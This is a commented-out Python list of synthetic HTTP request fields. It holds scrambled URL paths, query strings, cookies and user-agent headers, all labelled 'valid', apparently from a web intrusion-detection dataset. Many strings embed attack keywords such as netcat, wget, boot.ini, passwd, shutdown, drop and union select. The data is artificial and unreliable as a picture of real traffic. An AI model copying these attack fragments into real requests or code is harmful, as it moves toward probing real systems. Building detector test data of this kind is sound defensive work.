#  {'pattern': 'thie2juwiienish=9hkiw5;texqe=eiyrite', 'type': 'valid'},
#  {'pattern': 'ugrrtrfo (2rz5h4zyik; amg-dxhlkm)', 'type': 'valid'},
#  {'pattern': 'identity, gzip, compress, compress, gzip', 'type': 'valid'},
#  {'pattern': 'toaauriri/5.7.3.8.5', 'type': 'valid'},
#  {'pattern': '/fpq/eekefnmwtt/ucrahre/sddma-_qrqld.bin', 'type': 'valid'},
#  {'pattern': '/0ett5wcsllnb5naa4e/iframeaey3qzjd2s_eval/ebdjdb5xcjh/e3n_zsif2cshnemoo9.pl',
#   'type': 'valid'},
#  {'pattern': '/t4zjjvaf/5xevlb.gsm1cwpoi/kzznzy/gwrqhpdedlemtsq/4pr86v8tkp3vh_rp/1hdbc-gx9fg/vlfgvwenlh_azyug/t8noqdo/em/ta1hi2iglosomeep/sklkt/rzethiteenve1y.tiff',
#   'type': 'valid'},
#  {'pattern': 'ynetcatqf=%@4e;wutit5raaoi=netcanftoantshutdownih',
#   'type': 'valid'},
#  {'pattern': '/nrkk.yaxkwys74/y9zegut7ngnc.jpeg', 'type': 'valid'},
#  {'pattern': 'pa=dawmfh&68=ueratiacceptm&smsclrc=rspscdoritnpcreo&huefsfsiezshl=(no&orinbcztan=1wy-6fc3&sembtraxa=elhnrraf0mat&moandvtnn4lee=in&coraapgo8nsspte=6/ier8dc sseswud&ca9a=osewtsysru7fi&wtnfiupqnmalce=526932&fsr1ifllo=19&eciemmagiyvasos=ux@atgwra2wq&evha=e0ours&ozsdnontu=725904&oamth=e eh',
#   'type': 'valid'},
#  {'pattern': 'oezaeps=786;mirltaie=myh1v6oy;k93xsoiny=31436;di=9636425;valitebcd6t=uzi',
#   'type': 'valid'},
#  {'pattern': '*;q=0.5', 'type': 'valid'},
#  {'pattern': 'ueloodle20=7ecwcsty0nnngns', 'type': 'valid'},
#  {'pattern': '/a0tnauxg/thtiyht9aabtoed/i6tx3fzhslst1zzih4/snarbhdljmeuos/jtwrsw7@6.dcrzpfu/eki7raesi/ku.msf',
#   'type': 'valid'},
#  {'pattern': "seesifehc=~ettiohlweopeni'&keei=zt&iscprhimdogzeo=rrne&jaccess_log.mgflzddjy=89048310&k9sehsoigqg=eir e7au'-dt&eshqzcenlea2dso=b'/na&aonf9ws7n7e=e&l9coaywr=applf8n&lyeacceptt88=3wsnseztz&sme=352843&sam8j8_k=dgw&jcqf2z8mn=13315222",
#   'type': 'valid'},
#  {'pattern': 'ueloodle20=7ecwcsty0nnngns', 'type': 'valid'},
#  {'pattern': '/dulnuoipe/uamslxs3/asnneoeey.html', 'type': 'valid'},
#  {'pattern': 'mozilla/6.0 (compatible; msie 3.1; windows nt; hrzsam)',
#   'type': 'valid'},
#  {'pattern': 'rl-ler, iiti-el9thcwd;q=0.2', 'type': 'valid'},
#  {'pattern': '/i7ebrzb/listhuurflal5w/biowhs3/oic8aeyte2pqcb/aaqqzv.6zyatnx/io.8gc31c/eaohotofvyle/nrtfihrtrrsnyi/knp/3sosh.php3',
#   'type': 'valid'},
#  {'pattern': 'eie=e4ee|9rdt>ewexectelnetlio&qdteaqhshoxdpbe=74822935&ilyro=c nae9o&4wzhgrtstmo=ddrop3&szfio=8&usjcg.n=ebtinnsi&srcotyoeoq1or=r6-uosmc1z&ishpls=napiupffpv',
#   'type': 'valid'},
#  {'pattern': 'tz96doi=e3.bgtz@b7a&bfuiocdhbrpl=5.bcwp&ejdldivqq=1881248863&etedjs=9a&ssi7s=ur&zc_94p1x3mc=px4sgc73',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'mozilla/3.7 (x11; u; linux i586 8.8; ms-nn; rv:5.3.4) gecko/45951631',
#   'type': 'valid'},
#  {'pattern': "hdahtiarhkp2s=aesal&6oshvhiarei=nbivynwc_&rysrg7jaeoa8a=bjtn1tseamtpaslp&hypnqm1=ieyrest1n&tirss=asaprocessing-instruction&a6eg5o1epetldta=pcat'rqea[l'1nt<e r&nmns5b0knkr=0trtelnet&ordeiii=e9drtihacbwuej&arl6cucua=owhere&%ujko=gqbtux39ejw2&sr=48540&q9lnaoidm=nse union98cic&ofrhseajotrlnj=gz9aeaayiframe",
#   'type': 'valid'},
#  {'pattern': '/ixoxdpv9x/kgkcdlt78qvxrwt/tyha/liklezngf4/hkrecmdyp.msf',
#   'type': 'valid'},
#  {'pattern': 'reto-c;q=0.4', 'type': 'valid'},
#  {'pattern': 'shat=nt m\\)poh e', 'type': 'valid'},
#  {'pattern': '*;q=0.4', 'type': 'valid'},
#  {'pattern': 'giiiezh7=$al:hsldlsrig&ss=boot.inidrop', 'type': 'valid'},
#  {'pattern': 'mozilla/2.7 (windows; u; winnt 8.6; ar-g2; rv:6.7.2) gecko/03193712',
#   'type': 'valid'},
#  {'pattern': '/gavum-yz/tg.etqyicvb1ih/xw/betlayt/iskt6ltnejo.html',
#   'type': 'valid'},
#  {'pattern': '/otbpl/anhosfvfi.nj0vk/tchtup5wwir/563xpogqv3j5ckxb/na/wzghhku/oba2xxcgo8c5/yfpsuhaj0hy0d/jiybgsoundvtvm_/i-8vnypiz3rc7thp.jpeg',
#   'type': 'valid'},
#  {'pattern': 'shat=nt m\\)poh e', 'type': 'valid'},
#  {'pattern': '/connect0scriptkxcinu0h0j@bf/8vu2tx7mwe@pxpx7op.css',
#   'type': 'valid'},
#  {'pattern': '/tlkvovhi3azt67efv/ibtettapjrl8smlnode.gif', 'type': 'valid'},
#  {'pattern': 'mozilla/7.3 (machintosh; u; ppc 9.9; ns-to; rv:0.5.9) gecko/89332409',
#   'type': 'valid'},
#  {'pattern': 't4lemi7r-edacdi2;q=0.1, liedj9it-cooerah;q=0.4, mh2mntur-nfyi, viatcnt-hio',
#   'type': 'valid'},
#  {'pattern': '/eenihhlsstethg.cgi', 'type': 'valid'},
#  {'pattern': '/fa0c/nutb0x.asp', 'type': 'valid'},
#  {'pattern': 't4lemi7r-edacdi2;q=0.1, liedj9it-cooerah;q=0.4, mh2mntur-nfyi, viatcnt-hio',
#   'type': 'valid'},
#  {'pattern': 'lzsmae3mtaewr=fta$w icn=oesohb sls;oab6d=mim', 'type': 'valid'},
#  {'pattern': 'dcy@g7.o http://www.thrrf.de', 'type': 'valid'},
#  {'pattern': 'iyeiloa (3gqqyho_; ieskyl@s; dv-y92n; sd0adgsy7p)',
#   'type': 'valid'},
#  {'pattern': 'ethe2o=asn;y0asjep3faf=92338064;eo8eb=3syeeeojudeze1',
#   'type': 'valid'},
#  {'pattern': '*;q=0.1', 'type': 'valid'},
#  {'pattern': 'ter=snph-', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/vmigzttnhijt/nt6rrv9e/uic6tigwc/xbk/oon/bsztuylrehne53/nynshdo6nux/tmtcdpt/z2boot.inihttpaw/lec2.jpeg',
#   'type': 'valid'},
#  {'pattern': "txr3tazfha06=o(3r9iusrght'aioeeirg&exuiiislbers8eh=6_h&ni9rlcmethut=oeqosn5en&rdebrihirmgysn=m&hwx5ivt-1j=? nh&f3lsis=01881940&omaea05rnsf=e695oorm",
#   'type': 'valid'},
#  {'pattern': '/enektshtzwprroe/tjnl-at7c6/es_.pvpyzom_s/ab2rbbsmgln-fz9s5a/e3wn/r@8eqleq/access_logx2null2atnf/enpqswklu/qoxph/at1h5i8boariilbod/u8xqnnv/uh.ug.kpisccknn63-..tiff',
#   'type': 'valid'},
#  {'pattern': '*;q=0.9', 'type': 'valid'},
#  {'pattern': 'ss=998&n92texcirr9t=zduuzqg2a6bs&raniyutopeatca8=64117&rthior1rw=96062&asizp0d=4&zhbztitye0ho=8832010&lje9l7a=47807&er5cq9qtb=3a7eraobt1&doh=s 6tyoslortno3s&eppct=zeeteedoe&q4pufpyna=avrl&oaeantqaazpdi=8310',
#   'type': 'valid'},
#  {'pattern': '/lrst/1a5r/gq9vhe0asm5em/ajy/hfydkl6nqobmv.js', 'type': 'valid'},
#  {'pattern': 'woya=lc1q_ti.la', 'type': 'valid'},
#  {'pattern': '/spbk51v/iicopy-f_4xphpltmailczp/e_qhotdwcn4x3iw257v.css',
#   'type': 'valid'},
#  {'pattern': 'csi9e=732973&u6qmaearty=eh5r0b&qhsphs35iheaeu=775614966&sx@qsxp_nfm85=73817&36xtermjyg8m9uk5=4&shf9fb6wsa=rm-atwn4v&deehh=m2doos&y9ltrnfeurne=95021&achhshirsn=)r nc0formhrhi<c&qfxw-bwxunw=3',
#   'type': 'valid'},
#  {'pattern': '/cnseguo3iiagath/etbcmvgn59zf4m_scsq/n90wak/eum.uegqtt@z0.pl',
#   'type': 'valid'},
#  {'pattern': '/ovin/u4rrbtutamlicnnow9r/hr9teuinfilal7resh/t0vb/xtermjmr/brs8u/dea6e8lehe4itnsovad/nothzqrjg0a3lr/sqrwpc98yeog/2kl/bjk2isyformn.js',
#   'type': 'valid'},
#  {'pattern': 'ey7gesmbou=21306170&h@andzjh=a&oecc2t84sam1dh=in2&ieph=rmu1awaindocumentecho includekvnoa>o&1wqbn6f085o3=692426&nbaertntaq=yui70tifya1ocss&bno=615395&ssa9s4nc=cnh&oqqdilpeg=ozc&sgqy9pd6rm5=otcwuag&lghilienzd9rton=o3tydwoz&eyrnnr9eeuaaron=idibadmini~de&lf)ri%eo:&ozehsgori=ezfsoitale4&veicheatideo=ohoxbman',
#   'type': 'valid'},
#  {'pattern': '/w3/hchatkinf.gif', 'type': 'valid'},
#  {'pattern': 'irse-gnw, ebf-cnarne', 'type': 'valid'},
#  {'pattern': 'mozilla/1.0 (machintosh; u; ppc mac os x 1.1; so-ry; rv:4.9.6) gecko/17805427',
#   'type': 'valid'},
#  {'pattern': '/al/nlnl2/eut/isiaxooxo@h8hax2n/ooo/tm/ij4wmv-/hb/bidxg6ma@md3rsgd.js',
#   'type': 'valid'},
#  {'pattern': '/nu9u_3a_uxg/r22btxypnghsym/hgeszecl36or.shtml',
#   'type': 'valid'},
#  {'pattern': 'neroiod9eto6nit=a8j', 'type': 'valid'},
#  {'pattern': '/uzodmwg0w04eb/tlem/piaitlt0swn/ux3yp7xtermrzl5r/ei2v4yi/eno1i3tuf_cqn583grav/tha1dcuse/ggyb4opt.fpyhomef.jpeg',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'oiddotlxitkoypd=4268941708', 'type': 'valid'},
#  {'pattern': '/osomunode/entagtdierbhoilhneti/iazsovz/ftirn/ttus2a9s.aspx',
#   'type': 'valid'},
#  {'pattern': 'bxyrrayaona=vo&tsieocolrno=xtermto &egv= tiy<]kt ntstodi7i&yqoibncp2tsoh=925&ei=90985&eskgwwget=676258&od9cnt=54738375&nnn=y&l0cugnsre= bcat=s5htoaeta0&mtastajsdn=in&9jj6cmcdmjincludev=:e5flac<p)h&is4neserihaohr=enioe',
#   'type': 'valid'},
#  {'pattern': 'mozilla/7.6 (windows; u; win98 7.0; tr-nw; rv:2.3.3) gecko/57190452',
#   'type': 'valid'},
#  {'pattern': 's8n00l http://www.kgey.com', 'type': 'valid'},
#  {'pattern': '*;q=0.7', 'type': 'valid'},
#  {'pattern': '/te6oaee1euesesluc54r/uk0@vptzochtaccessro/ybfo66__nqf4gjaihk/lnymbviok/oyphnd/xxmlba/tet2ntsn7ahhmee/csi.js',
#   'type': 'valid'},
#  {'pattern': 'zt=coespsssoereattxna&t4cvgherjuloht=697971135&ktnpseh=(szeaseshtreiuafto&edhi5rmtd7=idrozea6',
#   'type': 'valid'},
#  {'pattern': '9emdoeuseisiih=tw3ynmmwldyz&twosnfdriann=933215836&n1gsoth7anylre=43749&7jm8erhgydc=aaus0rc7odrin&libvibw=546hlgemh&zd.nhwcatyw=(kq&weint=691617485&2aes2pt9m=2585&2_crmselecto=upotbtsiaae',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '/li9.html', 'type': 'valid'},
#  {'pattern': '/txhou9o9/rredokf/cp7lh5d-j0ys7lc@l8/oap/7smy.mdb',
#   'type': 'valid'},
#  {'pattern': '/htdqyevzcylei/fhotioh/h_trd@jseqk9dind./wiihoet9seenr/nea5gasbeeiinyoq/mpaxpprbaiba/iliy9rudaipe/twh.jpg',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'gzip', 'type': 'valid'},
#  {'pattern': 'inntlhgaihfri=6067575&wk1amgcmd=t0sckceetsaoe&vtm6ruye=ay.epug0sb&6zgutie92=4',
#   'type': 'valid'},
#  {'pattern': 'otar2cwsa=41378&betweenpfroma=lsoafe1gilsea&ynak=702349552&6tettittc=6r4osot&irbh0omqhn=liba&chnhts=9507&eee=h5iyiij nr&w2tsinscyndo3it=tjtz7zb&eqngnetsimetc=37&tt2i5eeefsir=37238&v48slittueheeg= a:bp&benc=073116295',
#   'type': 'valid'},
#  {'pattern': '/r@58tukm@msy/s6hq1s/enczilazaeo/obbg7dwixowgetbnestdin/2zluq3k74d2nlfti58m.jpeg',
#   'type': 'valid'},
#  {'pattern': 'alrshh7wttgelkt=tmpl3d7fqdu;nf~olei&swrd2ms=51701296&mz7qukfgmm=r5rtnlgaiaoh&netcat865cy=w2&oontoaou=47612',
#   'type': 'valid'},
#  {'pattern': '/nthbdet/izfb7d/0vmcfjs8aiw6@nposition/erbnrwflias/l1/7rparnoiaaushn6.png',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'ptjzhtaccesqhf=7736442&pcectrp=76&esyd=37e&inec=cre3haeenqove9b&a80ko3s=trcp&hosmea8itbe0ch=mlfbscfogrlsr9ed',
#   'type': 'valid'},
#  {'pattern': '/fzmsn_lgql/dnrvwsqqob/3htaib3ocedofenf/eqqcpqv8/anom6rheleie/d0oqxsamdbperlve_/du73xfxi7eifhnnwzus/axnskp.php4',
#   'type': 'valid'},
#  {'pattern': 'aet=027785&a0gn=o-j7qzcte&hieehazhoci=4&joaudnhne_t=eeomtdas&aienleatpztm=35565&ca=ubxwos@um-be&v0hsztsl=09&iseisia0u6bea=dnaa3na6myf&tsnedh6=02952&nnatheipf=ip9oq',
#   'type': 'valid'},
#  {'pattern': "ogtoik= tr2nr0rb[dlsi p&eformbwgethqp=vkmjsmoi&ek4mee=2ace&ennqippe=5852082&hoe1r3v5pge=teh06g&htiofaxt7te=r&xexec5-8v=atgdy>l&e0mfasdao=070001&bjstylep.nx=' rr&tsnuea=ero3hsa&miqaldwz=tj4x9cjion",
#   'type': 'valid'},
#  {'pattern': '/fqekrncyl4pp3sy/r0dimg.js', 'type': 'valid'},
#  {'pattern': 'zn0-m= is&ai=6981897657&els788drda=fr&vam9ce=7slvbdehh&nd8enhonrtesr=n-l n&i7xx=el6&au=h0r7',
#   'type': 'valid'},
#  {'pattern': 'da5izrnh4x=cul&wtni8snind=mdsthsheaeene&tnwodhyu=o riemaila/rtv&wnaakslo2een=131&odyc8shek40mcn=631&sseiho=regi/&passthrubfqfi=l>anua&l3upedtrile=ked&meysclett=8329269404&vn2ueehh6ksft=rsdsoeee9l&xt=ea~en&ioedotmyet=54',
#   'type': 'valid'},
#  {'pattern': '/boorcc/ur2htew7ircyedoou/rku0don6xuszox3l4drl.exe',
#   'type': 'valid'},
#  {'pattern': '*;q=0.0', 'type': 'valid'},
#  {'pattern': 'leie6v=tjwumeuura7;rgclbingdelete=<y?drop', 'type': 'valid'},
#  {'pattern': '/hrtegsdrim/emqng0kzlxhv.gif', 'type': 'valid'},
#  {'pattern': 'deflate;q=0.4, gzip;q=0.3', 'type': 'valid'},
#  {'pattern': '/haotljeeeh.shtml', 'type': 'valid'},
#  {'pattern': 'd@rmqusr4jxa=05604000;zd1wgetxju_vo=nmochart7y5af%bhoq;lctdy0ie8nc00=odqus.;ptaaym3h2uhni=s',
#   'type': 'valid'},
#  {'pattern': 'mozilla/7.1 (machintosh; u; mac os x 2.8; we-oe; rv:3.7.7) gecko/70280092',
#   'type': 'valid'},
#  {'pattern': '/ip0e8wvbipi/rmh/ah2fnj/awf5mz7qgaaw/rrnbeebvitnbweiimoh/mngksas/ir7whud9x_yao.cz/f4kxq0qduithp-by/tsi2ma0odcfpssrd5ye/4lt0i.sh',
#   'type': 'valid'},
#  {'pattern': '/mvktomu2d_214/h9-k1fis9wfqsil0/bz59_02yl55mtcmj8sw/e_eimhziipjq12x/tqtdlyilienhesiui9/titxe.js',
#   'type': 'valid'},
#  {'pattern': '/tv5xpfx.exe', 'type': 'valid'},
#  {'pattern': '/ntptui/p2ec5q/ttite1tbreltotpatr/lh.css', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'ieitdeogrl=3175269;mxp_lcugb5ip=rs;eeoi8arer=6;c1log2nsystem=1re',
#   'type': 'valid'},
#  {'pattern': 'saiuinmbedari=fa4yeiipefa&sgieyjtkamy7o=k eix%&.iy-umochadxy=364709&a4tiostvfogaex=43&oktlrsdebdrcke=7933&3tuvoeea=roae&ct5b1veznepxhn=85396929&ttfpaobihnai0o=7144788540&drgc4i1adosi6jo=eeaths4pnt6&ls0eimi=pec&u0rc=1&ialieideget=227',
#   'type': 'valid'},
#  {'pattern': '/wrtpgtjraw5ge/o.s4jpfrui3n55/hs83e5_w_4fguf7ia0/reaanki7odr/oodmoqzlmwdez6w/eqtiunbec/o.be-p_dq/tafebtnndnh1rpitleu/mteahvh/ifmcdulmt_insertsm8.png',
#   'type': 'valid'},
#  {'pattern': '6y=me8npenp&r7l=12860&nda=linm', 'type': 'valid'},
#  {'pattern': 'mozilla/3.0 (windows; u; win 9x 2.3; xy-gl; rv:6.5.9) gecko/22561508',
#   'type': 'valid'},
#  {'pattern': '/phpx/j--pp14/gt2crdihli1lpqs/oufcqph9caxo6d/3terwtocrh/tn.h/aaq2kuz_zxxvwf/0msf/sim3datmin.pl',
#   'type': 'valid'},
#  {'pattern': '/netreeajydooeuar/enroeibse1/glt/t@open6/mxuzyfziycv/-@/0lp-zn0jq00@a3ga/s.vd7md1/hjxalwwaotbtwwme/ldr3..mdb',
#   'type': 'valid'},
#  {'pattern': 'xo1txjw.scriptxe=etwe&aknadec3d4=ae&gpfqio05t6ef=b6eneh&iees=386&ienh=apmemaisj4ermnt&5rtqnusswe=abincsr&ee0=gnxieadi',
#   'type': 'valid'},
#  {'pattern': 'anrbv2npshinsert=r5elocationehqosa&tng=ocxmooehrdsnduau0',
#   'type': 'valid'},
#  {'pattern': 'yftgt/0.8.9', 'type': 'valid'},
#  {'pattern': 'mozilla/4.0 (compatible; msie 9.0; solaris; tenrl)',
#   'type': 'valid'},
#  {'pattern': 'ysqhoriaalxr=paerigt5 s', 'type': 'valid'},
#  {'pattern': 'mozilla/9.1 (compatible; xeitahci; win 9x; cdsisg; nseaetl; 1htieai9d)',
#   'type': 'valid'},
#  {'pattern': 'rkrrfoz=10160&aek6d3zdyketm=ypuo>ayss', 'type': 'valid'},
#  {'pattern': '*;q=0.3', 'type': 'valid'},
#  {'pattern': '*;q=0.8', 'type': 'valid'},
#  {'pattern': '/veee/wh2w.jpeg', 'type': 'valid'},
#  {'pattern': 'swlhnonhf=stcfrn&7tlogasvxpdo=423&@vwyjekrlgmetan=nhs7eo&eccrbt92eobl4t=ccsu',
#   'type': 'valid'},
#  {'pattern': 'l4bneree111drn=6nmsu;bfofya=603429;tmnhtaeowuo3=242185',
#   'type': 'valid'},
#  {'pattern': '/tb4ltyhjtb2s2dn/efyowp_extps@wors.asp', 'type': 'valid'},
#  {'pattern': 'mefirlivpe1ono6', 'type': 'valid'},
#  {'pattern': '/zcf/aano6neieslf8naht/e335c2o0g.cgi', 'type': 'valid'},
#  {'pattern': '/driineaho94reied/to-awoioo@9/ge9r-ohqrwnj69.nocr/ctohl@tt_s.wrx.gif',
#   'type': 'valid'},
#  {'pattern': 'm5eseddydn', 'type': 'valid'},
#  {'pattern': '/sxdeletexsrsh6gyscriptp/iy-pdeqewr/ki4p8evalinputvadmindal/oiaz7ncifsrenowoul/7kformbxvupj/usibrrrscripto/aeneu/1i.dkoxjqmchnpo56q.sh',
#   'type': 'valid'},
#  {'pattern': "hwstet14wy=efjurbsncsist9sj5&onhude=wq&gcer3jjqgi5u9d=fjexf28yz&po8bgsoundg_n=r7n9kr4v62c5&ir=eria'&etscy=2&rhelono2talcl=sslogntdaiqatz e$e&_jiccatbhdrop-=mhpmfdb-9",
#   'type': 'valid'},
#  {'pattern': 'tbtvedr-ah6dh, ll-adioekh;q=0.7, e-bhi7n, eyh1eel-iue;q=0.0, t-br0srree;q=0.6',
#   'type': 'valid'},
#  {'pattern': '*;q=0.4', 'type': 'valid'},
#  {'pattern': '/ddselhiy/d3p/sdfrdtmre/df4adpcswmymh5vv/nph-lxck6.-sjj6oui/epopyv4khfg5ncgmv-/wiereeadahod/ylinna.htm',
#   'type': 'valid'},
#  {'pattern': 'hlvniorseluoe5elllnh', 'type': 'valid'},
#  {'pattern': 'mozilla/0.5 (windows; u; windows nt 6.2; sa-tk; rv:4.4.1) gecko/56324033',
#   'type': 'valid'},
#  {'pattern': 'ohmoa=rori~lra/nns ;rm=42', 'type': 'valid'},
#  {'pattern': '/f08msmiyov9k.asp', 'type': 'valid'},
#  {'pattern': 'uur4em7sismsd=giitrmv1omii9e?&rojsamc@e=462682&daueet=pincludenehtpass (o$t e&zshutdownse$s &itrtinpm=t8',
#   'type': 'valid'},
#  {'pattern': '/eomtjs.tp/huldysedveuvine/oyfaqp-hyk4n.cl/clikrzfhsnmote.shtml',
#   'type': 'valid'},
#  {'pattern': 'ioei9=iee;geigaohpee=ish', 'type': 'valid'},
#  {'pattern': '/ax0/apcealpb0wa87rfet0l/2xyimgx.sy7faecxxu.shtml',
#   'type': 'valid'},
#  {'pattern': '/osahgeaa9aeuea5auian/orkhnnrcto9ppet/petouohb3brsow.shtml',
#   'type': 'valid'},
#  {'pattern': 'aq=eathto\\@mowt&bathk=37382&escriptrx2-d8k=tmpph&rlewh9m=sdfzeaiacmdc0y&htoze3au=orn@&qvycza@zg=eaeahsedpusseeen',
#   'type': 'valid'},
#  {'pattern': '/k3e9hglyh-r3/egpehkvsxblxjnkk3u/rsoiktgjs1ai/91g8ckga6daq4d4_kq9s/90wl7/srgtistdsrnah1/9lfjx3/palc5otrny3tn/@nodetftx.php4',
#   'type': 'valid'},
#  {'pattern': '/uhnihe/st/ekjsrnuexwhr/d1kmkau/ngishekmx@0vqce/6vd0o9ksq2a/xghnrdkgenucqaadi/gq09dr4/tqe-_q45ede/t8ssjhgnhenmilkua/exrsytpincieeem.gif',
#   'type': 'valid'},
#  {'pattern': 'b4am=so]n a9dropeoobject e9&nthlttooe=ufemoqci&eh4include.n-zboot.inietczt=zbsisulwarcyheeis&eawntdxeahygne=0892&t9qn6dh=[ w&neoiweou=resr&etaaefio=srg&2sn7g24h5--=aaip&hrdaa=iee>2i&lnpeposa=87096&iunan6ens=olhfaaaimrh8kl&gts9jutievaenj=noi',
#   'type': 'valid'},
#  {'pattern': '/ovrsufdsrtsseoafr/rxretzosnnt/iznf8@fm9kh/dqd8ev/ieprocessing-instructionp6x_9/bp83ioeosrnttn8kb/tsueu/hebtmwe8bigldb.r.js',
#   'type': 'valid'},
#  {'pattern': '*;q=0.9', 'type': 'valid'},
#  {'pattern': '/mme.sh', 'type': 'valid'},
#  {'pattern': "tnswtaaow=[hia~&ihttsar=eji8r&mfujmffz=1749&tk=x'nntyn/3o on/e&tvsit=2vscowll&vs=lkeyiaf5:oroh87&eti9nel16ryta=ptydcebesr>&beaa7ldceycalah=0b2ri&iiopse=euh&ubrctlsornojecs=o &wc8=0&98gdusmya=ma1ek&qeese9=ttudyeeaqempe&oan3nyitpw=e4j",
#   'type': 'valid'},
#  {'pattern': 'gylm=crk@ochhavingo9nir', 'type': 'valid'},
#  {'pattern': '*;q=0.4', 'type': 'valid'},
#  {'pattern': '/adxwqgx/eemss-.htm', 'type': 'valid'},
#  {'pattern': 'no2-otulho;q=0.0', 'type': 'valid'},
#  {'pattern': '/ecti3um/sqk-qpwvcsqrkm/etbnitpcroduneo/tnltsxaihioedm/cn-jvanxxexw/0io0qh3rheeonh/jfdocument2usrdm2/3yvnrv33xxujp/6xainhtoyuazedd/p-rse-ym66ezq/ryu7p_ml6ol7hvtfs.htm',
#   'type': 'valid'},
#  {'pattern': 'fllctffmz=eo;r&ldo3csl=edpssrahy&bviblataayds=46&moago1vrjf=senrqrelpc0etm&hyxed2epr=8189245&andhap1m=mesytso%u&useyrsdt=kuojl_@g-c.&wriioh=0teo@f]ye0a\\iathbeupdate&cwaedtrtl3=dygu2a&pchildmtnu=7i e&wpgil=dreni&lolaioeaseo=061967',
#   'type': 'valid'},
#  {'pattern': 'erttn5eylrpl=st&rmpmwz6=dn&obu47bsiieemf=mohk&ee=0-zddm&ameiiun65swzr=fni0',
#   'type': 'valid'},
#  {'pattern': 'mozilla/6.9 (compatible; msie 2.3; unix; achlpecsie; lyoies; yya7)',
#   'type': 'valid'},
#  {'pattern': '/izengvuka/hz31m7_q/obdq2tlmmnle9senurdn/udjxe.bin',
#   'type': 'valid'},
#  {'pattern': '/ekoh1qtrbkosis/2dssusvali/hdeoetirte/enodjnuno-5lonad/ae/ae/owepstmmbsmo/bpmm7/reiae98vjzuna/a-knaqklwgz@hk5n-b/y1roj_q1vg77/gktgeu2er1.htm',
#   'type': 'valid'},
#  {'pattern': 'oiohomhyneama=~swyn&co=swibhsreoys0rc&epse=tkxly8&nsfrnjn7tmsaie=oaiar&pehi=rd&vxa=163778&zsock_streamiazaccess_logqformjfei=204&lfjh4_fzrs=6040&8tgynfacnanmi=4991324&r9lwerttyelbmoy=6ihehm6&osoie3enli=anftnnqnhwmur&b1orixegweso=373065&echom50aq=connectel$wnullvaryu0aincludenhltut&odrjem=between\\diae0t1advh',
#   'type': 'valid'},
#  {'pattern': '/n_.58zv7whegixdt/lldpg/r7wu@/frip30js/6fjw86kitu9zcyxy1v/osetmsrnqwet.tiff',
#   'type': 'valid'},
#  {'pattern': 'ocso0=kou&ehuaero6nd=iii&8tesiui=eviy&0ctiaye4y=rfydcl',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'ldrdccttnny=1&siuiiyxseoe=gfdiuotexr6php\\=f&gsaciwic.mcmd=c%t4updateushutdown\\t2-ttiaepe&srsi8dft=niab0imqeee&iylea=thneexeq&elfnkm=eriodjemnc5c0etc&irermoi=fspjt&v6eeeswdir5=953&hbdtecnwth=1356&stt=679&gbkiya6s6stdinv=4&oiclnqtt6tsa9=ftpe&wsbmissio2=8468&zueufaohr7p=iiem1mmhesn1voc&tyfno5i4ai1tent=3',
#   'type': 'valid'},
#  {'pattern': 'la=s5n\\hse&awam5e=titaes:blnkeao&lqe=gnopene&servicesxtermytsa=e?&dsxoajhmp=a(oypasswdcopytaa3eo&3ifo1ss1aal8=81232&5oco1et=2891',
#   'type': 'valid'},
#  {'pattern': 'e6ei-een;q=0.2, e-aeub;q=0.9, c3e-erj, tm8ue-bgdc7wm;q=0.2',
#   'type': 'valid'},
#  {'pattern': 'rstaononseti=287&6eghpfsogrhheji= edt&o8iilsradtls=evalen;v&dzo0g=89&rcid=union/n5upesg&nldbxsdedqnye=stac&nit=0&rlia=ditsso4drhece&pb= 2m4up(3thiscript bawu\\&iorillm=mevmbebgsound6l&vknthr=snom&9ln9nozew=c0g',
#   'type': 'valid'},
#  {'pattern': '/im4ueblre2dephiwq2h/6xosina@ldgr@qradt/fb/rsmf/bwoe6phdeo8enloats/a97vtumuaybtgcdhvgz.html',
#   'type': 'valid'},
#  {'pattern': '/ct6eqhsnodnnhaai/ku9anph-ey.x_/mm.x42oblrwr6/ebvolzgoxkw/uloeig8edegtnabzl/uthgnudiwogdoj6/htleireuw4ne04ze0tr/s7kjj0a/vytetwe1nniu6eo5tiey/e4geslnabioldtd/a1lgd.cfm',
#   'type': 'valid'},
#  {'pattern': '*;q=0.2', 'type': 'valid'},
#  {'pattern': 'compress;q=0.6, identity;q=0.8, identity', 'type': 'valid'},
#  {'pattern': 'smwogrsyaa=ascsq9reler3pnsie&eeftel=806365&aiphntme=r<uinnetcat[v0xcr4e(ue2n=&ijaeths7ijjup=8414&uefeross=edboot.ini2etupdateehrtnl9ecglogin&@wmcunionkallhev=2nbc6exttnntftah&trest=933',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.4 (x11; u; unix 0.4; og-tv; rv:8.1.9) gecko/50977397',
#   'type': 'valid'},
#  {'pattern': '/2u5in@2/nbinkaao9scuhq8/awearcetitnl6ntsuay/v9ymkh3ijtg1/dubnd.hqkdw4enode/ekin97@.6iuguzddfd/xzov_rdopt7sx7r/cybjs/lcte7s4tnekk/rcguy-v/lrdvo/oni7.gif',
#   'type': 'valid'},
#  {'pattern': '/h6aiyjt1@vfxsdaqf9l.png', 'type': 'valid'},
#  {'pattern': '/datlmuaa/sijlm/viyt0abu/de02blpibmnt/l6snv/d5liodthtg0enwdoeds/5is_heikszw7fxdy.l/ikp7swaer0z8atdnyo/rzn85l3qgymrb.png',
#   'type': 'valid'},
#  {'pattern': '/uchild_t/t3z1_dyvlgd@qh/ny.xau3bh46lwpms/diw/usnvda3nlgtlhauxr/ftadfidsp1nmerwug/ty8ay.htm',
#   'type': 'valid'},
#  {'pattern': '/0en/sxymfml-zl2kty87s.y/h8sytbnsrdlhrk4er/hvdhwtdamnwoio/hea3tf61gtdlfxx@/etieqdnio/gstyle0./zr2_mxuo4/cr.png',
#   'type': 'valid'},
#  {'pattern': 'h-80iee', 'type': 'valid'},
